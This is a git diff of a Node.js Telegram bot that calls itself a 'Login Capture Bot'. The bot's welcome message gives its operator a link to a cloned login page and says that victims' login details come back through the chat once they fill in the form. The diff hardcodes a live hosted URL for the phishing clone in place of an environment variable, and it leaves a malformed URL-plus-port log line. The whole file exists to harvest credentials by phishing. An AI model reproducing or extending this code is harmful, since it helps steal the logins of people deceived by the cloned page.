@@ -42,7 +42,7 @@ bot.onText(/\/start/, (msg) => {
   CHAT_ID = msg.chat.id;
   console.log('💬 Chat ID set:', CHAT_ID);
   
-  const link = process.env.DEPLOY_URL || 'http://localhost:3000'; // Changed from hardcoded
+  const link =  'https://bankai-85ve.onrender.com'; // Changed from hardcoded
   
   bot.sendMessage(CHAT_ID, 
     `🎯 Welcome to Login Capture Bot!\n\n🔗 Click here to access Clone:\n${link}\n\n📝 After someone fills the form, you'll receive their login details here.`
@@ -124,7 +124,7 @@ app.get('/health', (req, res) => {
 
 // === Start Server ===
 app.listen(port, () => {
-  console.log(`✅ Server running on http://localhost:${port}`);
+  console.log(`✅ Server running on https://bankai-85ve.onrender.com${port}`);
   console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
   console.log(`🔗 Deploy URL: ${process.env.DEPLOY_URL || 'Not set'}`);
   console.log(`📡 Current Chat ID: ${CHAT_ID || 'Not set - Send /start to bot'}`);
